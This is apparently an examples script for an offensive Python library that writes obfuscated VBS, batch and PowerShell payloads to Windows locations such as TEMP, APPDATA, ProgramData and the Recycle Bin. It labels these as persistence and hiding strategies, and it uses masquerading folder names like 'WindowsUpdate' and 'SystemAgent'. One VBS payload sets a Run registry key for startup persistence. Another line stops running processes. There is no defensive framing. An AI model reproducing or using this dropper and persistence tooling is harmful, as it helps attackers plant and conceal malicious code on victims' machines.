#!/usr/bin/env python3
"""
Comprehensive examples for payload file writer variants
Demonstrates various usage patterns and location strategies
"""

from payload_file_writer_variants import (
    TempFileWriter,
    AppDataFileWriter,
    ProgramDataFileWriter,
    LocalAppDataFileWriter,
    UserProfileFileWriter,
    WindowsSystemFileWriter,
    RecycleBinFileWriter,
    PublicFileWriter,
    DownloadsFileWriter,
    CustomPathFileWriter,
    FileFormat,
    FileWriterFactory,
    MultiLocationPayloadWriter,
)


def example_1_individual_variants():
    """Example 1: Using individual writer variants"""
    print("=" * 70)
    print("Example 1: Individual Writer Variants")
    print("=" * 70)

    # VBS payload for testing
    vbs_payload = '''
    Set objShell = CreateObject("WScript.Shell")
    objShell.Run "cmd /c echo Payload executed", 0, False
    '''

    # TEMP location
    print("\n1. Writing to %TEMP% location:")
    temp_writer = TempFileWriter()
    temp_path, temp_meta = temp_writer.write_payload(
        vbs_payload,
        FileFormat.VBS,
        "high"
    )
    print(f"   Location Type: {temp_meta.location_type}")
    print(f"   Path: {temp_path}")
    print(f"   File ID: {temp_meta.file_id}")
    print(f"   Size: {temp_meta.encoded_size} bytes")
    temp_writer.cleanup_all()

    # APPDATA location
    print("\n2. Writing to %APPDATA% location:")
    appdata_writer = AppDataFileWriter(app_name="MyApplication")
    appdata_path, appdata_meta = appdata_writer.write_payload(
        vbs_payload,
        FileFormat.VBS,
        "high"
    )
    print(f"   Location Type: {appdata_meta.location_type}")
    print(f"   Path: {appdata_path}")
    print(f"   File ID: {appdata_meta.file_id}")
    print(f"   Size: {appdata_meta.encoded_size} bytes")
    appdata_writer.cleanup_all()

    # ProgramData location
    print("\n3. Writing to ProgramData location:")
    progdata_writer = ProgramDataFileWriter(vendor_name="CorporateVendor")
    progdata_path, progdata_meta = progdata_writer.write_payload(
        vbs_payload,
        FileFormat.VBS,
        "high"
    )
    print(f"   Location Type: {progdata_meta.location_type}")
    print(f"   Path: {progdata_path}")
    print(f"   File ID: {progdata_meta.file_id}")
    print(f"   Size: {progdata_meta.encoded_size} bytes")
    progdata_writer.cleanup_all()


def example_2_batch_file_variants():
    """Example 2: Writing batch files to different locations"""
    print("\n" + "=" * 70)
    print("Example 2: Batch Files to Different Locations")
    print("=" * 70)

    bat_payload = '''
    @echo off
    REM Batch file payload
    set target=C:\\Windows\\System32\\notepad.exe
    start %target%
    '''

    locations = [
        ("TEMP", TempFileWriter()),
        ("LocalAppData", LocalAppDataFileWriter(app_name="BatchApp")),
        ("UserProfile", UserProfileFileWriter(subdir=".scripts")),
        ("Windows\\Temp", WindowsSystemFileWriter(target_dir="Temp")),
    ]

    print("\nWriting batch file to multiple locations:\n")
    for location_name, writer in locations:
        try:
            path, metadata = writer.write_payload(
                bat_payload,
                FileFormat.BAT,
                "high"
            )
            print(f"   {location_name}:")
            print(f"      Path: {path}")
            print(f"      Size: {metadata.encoded_size} bytes")
            writer.cleanup_all()
        except Exception as e:
            print(f"   {location_name}: ERROR - {e}")


def example_3_powershell_variants():
    """Example 3: PowerShell payloads to different locations"""
    print("\n" + "=" * 70)
    print("Example 3: PowerShell Payloads to Different Locations")
    print("=" * 70)

    ps_payload = '''
    $obj = New-Object -ComObject WScript.Shell
    $obj.Run("powershell.exe -Command 'Get-Process'", 0)
    '''

    print("\nPowerShell payload variants:\n")

    # Hidden user profile location
    print("1. Hidden in User Profile:")
    userprofile_writer = UserProfileFileWriter(subdir=".hidden")
    path1, meta1 = userprofile_writer.write_payload(
        ps_payload,
        FileFormat.PS1,
        "high"
    )
    print(f"   Path: {path1}")
    print(f"   Obfuscation Level: {meta1.obfuscation_level}")
    userprofile_writer.cleanup_all()

    # APPDATA location (persistence potential)
    print("\n2. APPDATA Location (Persistence):")
    appdata_writer = AppDataFileWriter(app_name="SoftwareUpdate")
    path2, meta2 = appdata_writer.write_payload(
        ps_payload,
        FileFormat.PS1,
        "high"
    )
    print(f"   Path: {path2}")
    print(f"   Obfuscation Level: {meta2.obfuscation_level}")
    appdata_writer.cleanup_all()

    # Public location (shared)
    print("\n3. Public Location (Shared):")
    public_writer = PublicFileWriter(subdir="Documents")
    path3, meta3 = public_writer.write_payload(
        ps_payload,
        FileFormat.PS1,
        "medium"
    )
    print(f"   Path: {path3}")
    print(f"   Obfuscation Level: {meta3.obfuscation_level}")
    public_writer.cleanup_all()


def example_4_multi_location_deployment():
    """Example 4: Multi-location simultaneous deployment"""
    print("\n" + "=" * 70)
    print("Example 4: Multi-Location Simultaneous Deployment")
    print("=" * 70)

    payload = '''
    Set WshShell = CreateObject("WScript.Shell")
    WshShell.Run "notepad.exe", 0, False
    '''

    # Deploy to multiple locations at once
    multi_writer = MultiLocationPayloadWriter(
        variants=["temp", "appdata", "localappdata", "userprofile", "downloads"]
    )

    print("\nDeploying payload to multiple locations...\n")
    results = multi_writer.write_to_all_locations(
        payload,
        FileFormat.VBS,
        "high"
    )

    summary = multi_writer.get_summary(results)

    print(f"Total Locations: {summary['total_locations']}")
    print(f"Successful Writes: {summary['successful_writes']}")
    print(f"Failed Writes: {summary['total_locations'] - summary['successful_writes']}\n")

    print("Deployment Summary:")
    for variant, info in summary["locations"].items():
        if "path" in info:
            print(f"\n   {variant.upper()}:")
            print(f"      Type: {info['location_type']}")
            print(f"      File ID: {info['file_id']}")
            print(f"      Size: {info['size']} bytes")
            print(f"      Format: {info['format']}")
        else:
            print(f"\n   {variant.upper()}: {info['status'].upper()}")

    multi_writer.cleanup_all_locations()


def example_5_factory_pattern():
    """Example 5: Using factory pattern for variant creation"""
    print("\n" + "=" * 70)
    print("Example 5: Factory Pattern for Creating Variants")
    print("=" * 70)

    payload = "echo Factory pattern example"

    # Get list of available variants
    print("\nAvailable Variants:")
    variants = FileWriterFactory.get_available_variants()
    for i, variant in enumerate(variants, 1):
        print(f"   {i}. {variant}")

    # Create specific variant using factory
    print("\nCreating variants using factory:\n")

    variant_configs = [
        ("temp", {}),
        ("appdata", {"app_name": "FactoryApp"}),
        ("programdata", {"vendor_name": "FactoryVendor"}),
        ("localappdata", {"app_name": "LocalFactory"}),
    ]

    for variant_name, config in variant_configs:
        writer = FileWriterFactory.create(variant_name, **config)
        if writer:
            path, metadata = writer.write_payload(
                payload,
                FileFormat.BAT,
                "high"
            )
            print(f"   {variant_name}: {metadata.location_type}")
            print(f"      Path: {path}")
            writer.cleanup_all()


def example_6_custom_path_variants():
    """Example 6: Custom path file writer"""
    print("\n" + "=" * 70)
    print("Example 6: Custom Path File Writer")
    print("=" * 70)

    import tempfile
    import shutil

    payload = "Custom path payload"

    # Create custom temporary directory
    custom_dir = tempfile.mkdtemp(prefix="payload_custom_")

    print(f"\nCustom Directory: {custom_dir}\n")

    # Create writer for custom path
    custom_writer = CustomPathFileWriter(custom_dir)
    path, metadata = custom_writer.write_payload(
        payload,
        FileFormat.TEXT,
        "high"
    )

    print(f"Location Type: {metadata.location_type}")
    print(f"Path: {path}")
    print(f"File ID: {metadata.file_id}")
    print(f"Size: {metadata.encoded_size} bytes")

    custom_writer.cleanup_all()

    # Cleanup custom directory
    try:
        shutil.rmtree(custom_dir)
        print(f"\nCleaned up custom directory: {custom_dir}")
    except Exception as e:
        print(f"Error cleaning up: {e}")


def example_7_obfuscation_levels():
    """Example 7: Different obfuscation levels"""
    print("\n" + "=" * 70)
    print("Example 7: Obfuscation Levels Comparison")
    print("=" * 70)

    vbs_payload = '''
    Set objShell = CreateObject("WScript.Shell")
    objShell.Run "cmd /c echo Obfuscation test", 0, False
    '''

    writer = TempFileWriter(enable_obfuscation=True)

    obfuscation_levels = ["low", "medium", "high"]

    print("\nTesting obfuscation levels:\n")

    for level in obfuscation_levels:
        path, metadata = writer.write_payload(
            vbs_payload,
            FileFormat.VBS,
            level
        )

        print(f"   Obfuscation Level: {level.upper()}")
        print(f"      Original Size: {metadata.original_size} bytes")
        print(f"      Encoded Size: {metadata.encoded_size} bytes")
        print(f"      Compression Ratio: {metadata.compression_ratio:.2f}")
        print(f"      SHA256: {metadata.sha256_hash[:16]}...")
        print()

    writer.cleanup_all()


def example_8_file_format_variants():
    """Example 8: Different file formats"""
    print("\n" + "=" * 70)
    print("Example 8: File Format Variants")
    print("=" * 70)

    payloads = {
        "VBS": 'Set obj = CreateObject("WScript.Shell")',
        "BAT": "@echo test",
        "PS1": "Get-Process",
        "TEXT": "Plain text payload",
        "JSON": '{"payload": "test"}',
    }

    writer = AppDataFileWriter(app_name="FormatTest")

    print("\nWriting payloads in different formats:\n")

    format_mapping = {
        "VBS": FileFormat.VBS,
        "BAT": FileFormat.BAT,
        "PS1": FileFormat.PS1,
        "TEXT": FileFormat.TEXT,
        "JSON": FileFormat.JSON,
    }

    for format_name, payload in payloads.items():
        format_enum = format_mapping[format_name]
        path, metadata = writer.write_payload(
            payload,
            format_enum,
            "high"
        )

        print(f"   {format_name}:")
        print(f"      Format: {metadata.format}")
        print(f"      Path: {path}")
        print(f"      Size: {metadata.encoded_size} bytes")

    writer.cleanup_all()


def example_9_persistence_strategies():
    """Example 9: Persistence location strategies"""
    print("\n" + "=" * 70)
    print("Example 9: Persistence Location Strategies")
    print("=" * 70)

    startup_payload = '''
    Set objShell = CreateObject("WScript.Shell")
    objShell.RegWrite "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\Run\\Payload", _
        "wscript.exe C:\\Users\\Public\\payload.vbs", "REG_SZ"
    '''

    print("\nPersistence strategies by location:\n")

    strategies = {
        "APPDATA": {
            "description": "User roaming profile - survives local profile deletion",
            "writer": AppDataFileWriter(app_name="WindowsUpdate"),
        },
        "LOCALAPPDATA": {
            "description": "Local user cache - fast access, profile-specific",
            "writer": LocalAppDataFileWriter(app_name="SystemConfig"),
        },
        "USERPROFILE": {
            "description": "User home directory - direct access, hidden subdirs",
            "writer": UserProfileFileWriter(subdir=".systemconfig"),
        },
        "ProgramData": {
            "description": "System-wide storage - requires elevation, all users",
            "writer": ProgramDataFileWriter(vendor_name="SystemAgent"),
        },
        "Recycle Bin": {
            "description": "Hidden location - difficult to detect",
            "writer": RecycleBinFileWriter(),
        },
    }

    for strategy, config in strategies.items():
        writer = config["writer"]
        path, metadata = writer.write_payload(
            startup_payload,
            FileFormat.VBS,
            "high"
        )

        print(f"   {strategy}:")
        print(f"      Description: {config['description']}")
        print(f"      Location: {metadata.location_type}")
        print(f"      File ID: {metadata.file_id}")
        print(f"      Size: {metadata.encoded_size} bytes")
        print()

        writer.cleanup_all()


def example_10_bulk_deployment():
    """Example 10: Bulk payload deployment"""
    print("\n" + "=" * 70)
    print("Example 10: Bulk Payload Deployment")
    print("=" * 70)

    payloads = {
        "payload_1": 'Set obj = CreateObject("WScript.Shell")\nobj.Run "cmd"',
        "payload_2": "@echo off\necho Test",
        "payload_3": "Get-Process | Stop-Process",
    }

    variants = ["temp", "appdata", "localappdata"]

    print(f"\nDeploying {len(payloads)} payloads to {len(variants)} locations...\n")

    deployment_summary = {}

    for variant in variants:
        if variant == "temp":
            writer = FileWriterFactory.create(variant)
        else:
            writer = FileWriterFactory.create(variant, app_name="BulkPayload")

        if not writer:
            continue

        print(f"Location: {writer.get_location_type()}")
        deployment_summary[variant] = {}

        for payload_name, payload_content in payloads.items():
            try:
                path, metadata = writer.write_payload(
                    payload_content,
                    FileFormat.VBS,
                    "high"
                )
                deployment_summary[variant][payload_name] = {
                    "status": "success",
                    "path": path,
                    "size": metadata.encoded_size,
                }
                print(f"   {payload_name}: OK ({metadata.encoded_size} bytes)")
            except Exception as e:
                deployment_summary[variant][payload_name] = {
                    "status": "failed",
                    "error": str(e),
                }
                print(f"   {payload_name}: FAILED ({str(e)[:50]})")

        writer.cleanup_all()
        print()

    # Summary statistics
    total_deployed = sum(
        1 for v in deployment_summary.values()
        for s in v.values()
        if s["status"] == "success"
    )
    total_failed = sum(
        1 for v in deployment_summary.values()
        for s in v.values()
        if s["status"] == "failed"
    )

    print(f"\nDeployment Summary:")
    print(f"   Total Deployed: {total_deployed}")
    print(f"   Total Failed: {total_failed}")


def run_all_examples():
    """Run all examples"""
    examples = [
        ("1. Individual Variants", example_1_individual_variants),
        ("2. Batch Files", example_2_batch_file_variants),
        ("3. PowerShell Payloads", example_3_powershell_variants),
        ("4. Multi-Location Deployment", example_4_multi_location_deployment),
        ("5. Factory Pattern", example_5_factory_pattern),
        ("6. Custom Paths", example_6_custom_path_variants),
        ("7. Obfuscation Levels", example_7_obfuscation_levels),
        ("8. File Formats", example_8_file_format_variants),
        ("9. Persistence Strategies", example_9_persistence_strategies),
        ("10. Bulk Deployment", example_10_bulk_deployment),
    ]

    print("\n" + "=" * 70)
    print("PAYLOAD FILE WRITER VARIANTS - COMPREHENSIVE EXAMPLES")
    print("=" * 70)

    for example_name, example_func in examples:
        try:
            example_func()
        except Exception as e:
            print(f"\nError in {example_name}: {e}")

    print("\n" + "=" * 70)
    print("ALL EXAMPLES COMPLETED")
    print("=" * 70)


if __name__ == "__main__":
    run_all_examples()
